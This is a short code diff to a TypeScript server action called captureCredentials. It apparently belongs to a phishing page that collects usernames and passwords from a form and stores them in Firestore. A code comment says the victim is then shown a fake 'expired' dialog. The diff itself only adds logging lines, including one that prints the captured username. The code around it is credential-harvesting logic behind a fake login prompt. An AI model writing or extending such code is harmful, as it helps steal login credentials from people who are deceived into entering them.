@@ -18,7 +18,10 @@ export async function captureCredentials(prevState: any, formData: FormData) {
   const username = formData.get('username') as string;
   const password = formData.get('password') as string;
 
+  console.log('Capturing credentials for:', username);
+
   if (!username || !password) {
+    console.log('Submission failed: Missing username or password.');
     return { success: false, message: 'Username and password are required.' };
   }
 
@@ -31,6 +34,7 @@ export async function captureCredentials(prevState: any, formData: FormData) {
       createdAt: serverTimestamp(),
     });
     
+    console.log('Successfully saved credentials to Firestore.');
     // This is the state we return on success. The client will show the "expired" dialog.
     return { success: true, message: 'Submission successful.' };
 
